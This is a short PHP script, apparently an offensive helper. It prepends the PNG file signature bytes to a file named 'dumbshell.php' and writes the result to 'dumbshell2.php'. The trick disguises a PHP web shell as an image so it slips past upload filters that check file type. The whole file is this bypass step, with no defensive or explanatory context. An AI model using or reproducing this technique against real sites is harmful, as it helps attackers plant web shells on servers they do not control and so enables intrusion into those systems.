<?php
$pieces = explode(' ', '137 80 78 71 13 10 26 10');
$contents = file_get_contents('dumbshell.php');
$fp = fopen('dumbshell2.php', 'wb');
foreach ($pieces as $piece) {
    fwrite($fp, chr($piece));
}
fwrite($fp, $contents);
fclose($fp);

